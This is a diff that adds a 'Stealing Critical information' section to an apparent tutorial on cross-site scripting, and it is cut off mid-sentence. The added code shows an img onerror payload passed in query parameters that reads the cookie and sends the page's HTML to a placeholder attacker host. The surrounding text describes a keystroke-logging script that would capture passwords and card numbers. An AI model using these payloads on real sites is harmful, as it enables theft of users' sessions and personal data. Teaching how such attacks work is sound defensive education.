@@ -179,3 +179,13 @@ If maliciously I passed below script as a query param then that script will exec
 
 and everytime user writing something code script will just pick the keystrokes and make a request to uri with the user input /data as a payload. This will potentially pick your credit card number then password and will be direct threat to your security.
 
+### Stealing Critical information:
+<hr>
+It'll just copy paste your whole DOM and pass it to the hacker.Just add a script and pass it in the query params.Like example:
+
+```js
+Passing in Query Params:
+
+<img src="empty.gif" onerror="var mycookie=document.cookie; new Image().src=`http://hackerEndpoint/fpage.php?output=${document.body.innerHTML}`;">
+```
+This can just able to copy paste every single information o
